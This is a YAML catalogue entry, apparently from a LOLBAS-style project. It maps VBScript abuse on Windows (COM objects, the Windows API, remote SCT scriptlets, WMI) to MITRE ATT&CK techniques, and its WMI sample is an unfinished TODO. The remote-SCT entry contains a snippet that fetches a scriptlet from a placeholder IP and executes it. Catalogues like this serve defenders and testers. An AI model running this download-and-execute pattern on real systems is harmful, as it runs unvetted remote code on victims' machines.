---
Name: VBScript
Description: VBScript is a common scripting language on Windows environements
Author: 'Hegusung'
Created: 2024-10-23
Categories:
  - Category: COM Objects
    Description: VBScript - COM
    Usecase: VBScript can access and execute COM objects
    MitreID: T1546
    OperatingSystem: Windows XP, Windows 7, Windows 8, Windows 10, Windows 11
    Code_Sample:
    Tags:
      - Origin: LOLBas
      - Origin: Clickable
  - Category: Windows API
    Description: VBScript - Windows API
    Usecase: VBScript can execute Windows API
    MitreID: T1106
    OperatingSystem: Windows XP, Windows 7, Windows 8, Windows 10, Windows 11
    Code_Sample:
    Tags:
      - Origin: LOLBas
      - Origin: Clickable
  - Category: Remote SCT
    Description: VBScript - SCT
    Usecase: VBScript can execute a SCT file using the GetObject function. Remote files can be accessed
    Code: |
      Dim SCTObj
      Set SCTObj = GetObject("script: http://1.2.3.4/script.sct")
      SCTObj.Exec
    MitreID: T1546
    OperatingSystem: Windows XP, Windows 7, Windows 8, Windows 10, Windows 11
    Code_Sample:
    Tags:
      - Origin: LOLBas
      - Origin: Clickable
  - Category: WMI
    Description: VBScript - WMI
    Usecase: VBScript can execute a WMI Queries by leveraging com objects
    Code: |
      TODO: Exemple code
    MitreID: T1546
    OperatingSystem: Windows XP, Windows 7, Windows 8, Windows 10, Windows 11
    Code_Sample:
    Tags:
      - Origin: LOLBas
      - Origin: Clickable
Detection:
Resources:
  - Link: https://hegusung.github.io/LOLBAS-Project-hegusung.github.io/#/vbscript
Acknowledgement:
  - Person: Hegusung
    Handle: '@hegusung'
---
